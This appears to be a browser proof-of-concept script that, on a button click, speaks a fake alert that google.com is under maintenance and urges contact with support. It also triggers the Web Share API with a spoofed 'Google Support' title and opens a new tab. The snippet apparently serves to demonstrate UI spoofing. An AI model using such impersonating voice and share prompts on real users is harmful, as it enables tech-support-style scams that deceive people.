<script>
const btn = document.getElementById('speechBtn');
const status = document.getElementById('status');

btn.addEventListener('click', async () => {

  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";

  if (!('speechSynthesis' in window)) {
    status.textContent = "SpeechSynthesis not supported.";
    return;
  }

  const utter = new SpeechSynthesisUtterance(text);
  utter.lang = 'en-US';

  const voices = speechSynthesis.getVoices();
  const enVoice = voices.find(v => v.lang.startsWith('en'));
  if (enVoice) utter.voice = enVoice;

  status.textContent = "Triggering actions...";

  // Trigger speech
  speechSynthesis.speak(utter);

  // Web Share API
  if (navigator.share) {
    try {
      await navigator.share({
        title: "Google Support",
        text: "google.com is currently under maintenance. Contact support.",
        url: "https://google.com"
      });
      console.log("[PoC] Share triggered");
    } catch (err) {
      console.log("Share cancelled", err);
    }
  } else {
    console.log("Web Share API not supported");
  }

  // Open new tab
  window.open('https://google.com', '_blank');

});
</script>
